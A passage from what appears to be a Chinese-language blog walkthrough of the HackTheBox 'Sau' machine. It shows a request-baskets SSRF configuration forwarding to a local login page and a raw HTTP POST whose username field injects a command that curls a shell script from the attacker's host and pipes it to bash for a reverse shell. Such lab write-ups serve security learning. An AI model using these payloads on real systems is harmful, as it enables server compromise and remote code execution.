+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 52
+Content-Type: application/x-www-form-urlencoded
+
+&#123;
+  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;,
+  &quot;proxy_response&quot;: true,
+  &quot;insecure_tls&quot;: false,
+  &quot;expand_path&quot;: true,
+  &quot;capacity&quot;: 250
+&#125;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- RCE使用curl反弹shell数据报：</span><br><span class="line">  </span><br><span class="line">- ```http</span><br><span class="line">  POST /rktest HTTP/1.1</span><br><span class="line">  Host: 10.10.11.224:55555</span><br><span class="line">  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line">  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">  Accept-Language: en-US,en;q=0.5</span><br><span class="line">  Accept-Encoding: gzip, deflate</span><br><span class="line">  Connection: close</span><br><span class="line">  Upgrade-Insecure-Requests: 1</span><br><span class="line">  Content-Length: 52</span><br><span class="line">  Content-Type: application/x-www-form-urlencoded</span><br><span class="line">  </span><br><span class="line">  username=%3b%60curl+10.10.14.15%2fshell.sh%7cbash%60</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/09/12/007_machine_sau/">http://example.com/2023/09/12/007_machine_sau/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2023/09/12/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/" title="测试博客"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">测试博客</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E6%9C%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">一、前期探测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81reques-baskets%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">二、reques baskets漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81Maltrail%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、Maltrail漏洞利用：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">五、权限提升：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">六、总结：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">七、参考：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/13/android%E8%93%9D%E7%89%99%E5%8A%A9%E6%89%8B%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/" title="android蓝牙助手开发记录">android蓝牙助手开发记录</a><time datetime="2023-09-12T16:41:33.000Z" title="Created 2023-09-13 00:41:33">2023-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/12/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/" title="测试博客">测试博客</a><time datetime="2023-09-12T09:51:25.000Z" title="Created 2023-09-12 17:51:25">2023-09-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/12/007_machine_sau/" title="hackthebox靶场Sau打靶记录">hackthebox靶场Sau打靶记录</a><time datetime="2023-09-12T09:51:25.000Z" title="Created 2023-09-12 17:51:25">2023-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
